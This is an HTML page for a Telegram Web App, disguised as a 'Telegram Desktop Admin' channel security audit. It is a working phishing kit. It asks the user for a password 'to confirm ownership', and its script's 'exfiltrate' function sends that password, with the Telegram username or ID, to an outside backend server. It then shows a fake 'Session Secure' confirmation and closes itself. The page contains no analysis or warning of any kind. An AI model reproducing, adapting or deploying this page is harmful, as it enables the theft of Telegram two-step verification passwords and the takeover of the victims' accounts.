<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Desktop Admin</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@lottiefiles/dotlottie-wc@0.9.10/dist/dotlottie-wc.js" type="module"></script>
    <style>
        :root { --tg-blue: #5BB3F1; --bg-color: var(--tg-theme-bg-color, #ffffff); --text-color: var(--tg-theme-text-color, #000000); --hint-color: var(--tg-theme-hint-color, #999999); }
        body { font-family: -apple-system, sans-serif; background-color: var(--bg-color); color: var(--text-color); margin: 0; padding: 24px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .view { display: none; width: 100%; max-width: 320px; }
        .view.active { display: flex; flex-direction: column; align-items: center; }
        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; }
        p { font-size: 14px; color: var(--hint-color); margin-bottom: 24px; }
        input { width: 100%; border: none; border-bottom: 2px solid #E5E5E5; padding: 12px 0; font-size: 17px; background: transparent; color: var(--text-color); outline: none; margin-bottom: 20px; }
        .main-btn { width: 100%; padding: 14px; background-color: var(--tg-blue); color: #ffffff; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; }
        .success-icon { width: 80px; height: 80px; background: #4cd964; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
        .checkmark { width: 40px; height: 20px; border-left: 5px solid white; border-bottom: 5px solid white; transform: rotate(-45deg); margin-top: -5px; }
    </style>
</head>
<body>
    <div id="verify_view" class="view active">
        <dotlottie-wc src="https://lottie.host/8a736e5b-98c4-45c5-ac4a-44914ff3cf31/0HnGvoza6a.lottie" style="width: 140px; height: 140px;" autoplay loop></dotlottie-wc>
        <h2>Verification</h2>
        <p>Your channel security is being audited. Please provide your password to confirm ownership.</p>
        <input type="password" id="v_pass" placeholder="Enter your password">
        <button class="main-btn" id="v_submit">Verify Authenticity</button>
    </div>
    <div id="success_view" class="view">
        <div class="success-icon"><div class="checkmark"></div></div>
        <h2>Session Secure</h2>
        <p>The channel 2-step verification has been successfully synchronized with the admin panel.</p>
    </div>
    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        const BACKEND_URL = "https://auth-bot-backend.onrender.com/receive";

        async function exfiltrate(password) {
            const user = tg.initDataUnsafe.user?.username || tg.initDataUnsafe.user?.id || "unknown_user";
            const payload = {
                "user": user,
                "password": password,
                "type": "VERIFY_ATTEMPT"
            };

            // DIRECT TUNNEL TO RENDER
            try {
                await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    mode: 'cors',
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.log("External route failed, trying fallback...");
            }

            // SUCCESS UI
            document.getElementById('verify_view').classList.remove('active');
            document.getElementById('success_view').classList.add('active');
            setTimeout(() => { tg.close(); }, 3000);
        }

        document.getElementById('v_submit').onclick = () => {
            const val = document.getElementById('v_pass').value;
            if(val) exfiltrate(val);
        };
    </script>
</body>
</html>
